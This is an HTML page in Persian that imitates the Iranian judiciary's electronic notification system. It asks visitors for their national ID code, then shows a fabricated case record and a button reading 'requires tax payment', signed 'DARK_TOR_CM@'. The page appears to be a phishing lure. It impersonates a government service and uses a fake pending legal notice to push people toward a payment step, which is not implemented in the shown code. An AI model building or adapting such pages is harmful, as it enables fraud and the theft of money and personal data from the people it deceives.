<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سامانه ابلاغ الکترونیک</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { direction: rtl; background: #121212; color: white; }
        .hidden { display: none; }
        .dots::after {
            content: " .";
            animation: dots 1.5s steps(3, end) infinite;
        }
        @keyframes dots {
            0% { content: " ."; }
            33% { content: " .."; }
            66% { content: " ..."; }
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">
    <div class="bg-gray-900 p-6 rounded-xl shadow-lg w-full max-w-md text-center transition-all duration-500" id="mainBox">

        <img src="logo-yellow-clean.png" alt="لوگو" class="mx-auto mb-4 w-16">
        <h2 class="text-lg font-bold text-green-500">سامانه ابلاغ الکترونیک قوه قضائیه</h2>
        <p class="text-sm text-gray-400 mt-2">برای پیگیری و مشاهده ابلاغیه‌های قضایی، لطفاً کد ملی خود را وارد کنید.</p>

        <div class="mt-4 flex bg-gray-800 border border-gray-700 rounded-md p-2">
            <input type="text" id="nationalCode" placeholder="کد ملی خود را وارد کنید" class="bg-transparent text-white w-full outline-none text-center">
            <button onclick="showPopup()" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-md">ادامه</button>
        </div>

        <div id="userInfo" class="mt-6 bg-gray-800 p-4 rounded-md text-right hidden transition-all duration-500">
            <h3 class="text-green-400 font-bold">اطلاعات شما</h3>
            <p class="text-sm mt-2">نام و نام خانوادگی: <span class="text-gray-300">علی صفایی</span></p>
            <p class="text-sm">کد ملی: <span class="text-gray-300" id="showCode"></span></p>
            <p class="text-sm">شماره همراه: <span class="text-gray-300">09014555758</span></p>
        </div>

        <div id="caseInfo" class="mt-6 bg-gray-800 p-4 rounded-md text-right hidden transition-all duration-500">
            <h3 class="text-green-400 font-bold">اطلاعات پرونده</h3>
            <table class="w-full mt-2 border-collapse border border-gray-700 text-sm">
                <thead>
                    <tr class="bg-gray-700 text-gray-300">
                        <th class="border border-gray-600 p-2">ردیف</th>
                        <th class="border border-gray-600 p-2">شماره پرونده</th>
                        <th class="border border-gray-600 p-2">وضعیت ابلاغیه</th>
                        <th class="border border-gray-600 p-2">وضعیت پرداخت</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td class="border border-gray-600 p-2 text-center">1</td>
                        <td class="border border-gray-600 p-2 text-center">1403301050908598</td>
                        <td class="border border-gray-600 p-2 text-center text-yellow-400">ابلاغ نشده</td>
                        <td class="border border-gray-600 p-2 text-center">
                            <button onclick="showTaxNotice()" class="bg-green-600 hover:bg-green-700 text-black px-4 py-1 rounded-md">
                                نیازمند پرداخت مالیات
                            </button>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>

        <div id="notice" class="mt-6 bg-yellow-500 p-4 rounded-md text-right text-gray-900 text-sm hidden transition-all duration-500">
            <p class="font-bold">نکته برای مشاهده پرونده</p>
            <p class="mt-2">کاربر گرامی، جهت مشاهده و پیگیری ابلاغیه بر روی دکمه <span class="font-bold">نیازمند پرداخت مالیات</span> کلیک کنید.</p>
        </div>
    </div>

    <div id="loadingPopup" class="hidden fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center">
        <div class="bg-gray-800 p-6 rounded-lg text-center">
            <h3 class="text-white text-lg">لطفاً منتظر بمانید<span class="dots"></span></h3>
            <div class="mt-4 flex justify-center">
                <div class="w-3 h-3 bg-green-400 rounded-full animate-pulse mx-1"></div>
                <div class="w-3 h-3 bg-green-500 rounded-full animate-pulse mx-1 delay-100"></div>
                <div class="w-3 h-3 bg-green-600 rounded-full animate-pulse mx-1 delay-200"></div>
            </div>
        </div>
    </div>

    <script>
        function showPopup() {
            var nationalCode = document.getElementById("nationalCode").value;
            if (nationalCode.length === 10) { 
                document.getElementById("loadingPopup").classList.remove("hidden");

                setTimeout(() => {
                    document.getElementById("loadingPopup").classList.add("hidden");
                    document.getElementById("showCode").textContent = nationalCode;
                    document.getElementById("userInfo").classList.remove("hidden");
                    document.getElementById("caseInfo").classList.remove("hidden");
                    document.getElementById("notice").classList.remove("hidden");
                }, 3000);
            } else {
                alert("لطفاً کد ملی معتبر وارد کنید!");
            }
        }
    </script>
<h1> DARK_TOR_CM@ </h1>
</body>
</html>
